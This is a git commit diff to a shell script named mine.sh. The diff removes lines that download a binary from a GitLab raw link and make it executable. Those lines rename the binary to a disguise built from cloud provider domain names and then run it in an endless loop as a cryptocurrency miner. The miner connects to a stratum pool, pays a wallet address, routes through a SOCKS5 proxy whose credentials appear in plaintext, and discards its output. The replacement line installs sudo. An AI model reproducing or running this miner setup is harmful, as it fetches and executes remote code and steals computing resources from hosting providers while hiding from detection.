a71684b8f3d49604a13ce2901eb1d35d3d4e0d0a
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 05:20:37 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,5 +1,2 @@
 #!/bin/bash
-wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant
-chmod 777 plant
-mv plant scalingo.com.google.com.heroku.com.github.com
-while :; do timeout 1m ./scalingo.com.google.com.heroku.com.github.com -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Tet -p c=SIP -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80 >/dev/null 2>&1 ; sleep 5s; done
+apt install sudo -y
